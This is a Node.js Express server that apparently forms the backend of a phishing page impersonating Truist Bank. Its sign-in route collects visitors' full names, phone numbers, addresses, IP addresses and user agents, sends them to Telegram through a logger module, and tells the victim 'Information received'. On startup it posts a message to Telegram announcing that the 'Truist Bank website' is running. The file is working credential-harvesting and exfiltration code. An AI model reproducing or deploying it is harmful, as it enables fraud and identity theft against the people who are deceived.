const express = require('express');
const path = require('path');
const { logToTelegram, sendToTelegram } = require('./telegram-logger');

const app = express();
const PORT = 5000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/signin', (req, res) => {
  const { fullName, phone, address } = req.body;
  
  logToTelegram('Sign-in Attempt', {
    fullName,
    phone,
    address,
    ip: req.ip,
    userAgent: req.get('user-agent')
  });

  res.json({ success: true, message: 'Information received' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on http://0.0.0.0:${PORT}`);
  sendToTelegram('🚀 <b>Server Started</b>\n\nTruist Bank website is now running on port ' + PORT);
});
